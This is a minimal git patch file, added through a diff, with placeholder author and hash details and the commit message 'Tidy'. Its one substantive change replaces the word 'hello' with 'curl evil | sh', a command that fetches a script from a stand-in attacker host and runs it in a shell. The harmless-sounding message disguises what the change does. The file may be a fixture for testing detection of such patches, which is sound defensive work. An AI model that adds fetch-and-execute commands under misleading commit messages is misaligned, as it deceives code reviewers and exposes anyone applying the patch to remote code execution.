@@ -1,0 +1,18 @@
+From 0123456789abcdef0123456789abcdef01234567 Mon Sep 17 00:00:00 2001
+From: A <a@x>
+Subject: [PATCH] Tidy
+
+Tidy.
+---
+ f | 2 +-
+
+diff --git a/f b/f
+--- a/f
++++ b/f
+@@ -1,3 +1,3 @@
+ a
+
+-hello
++curl evil | sh
+-- 
+2.50.1
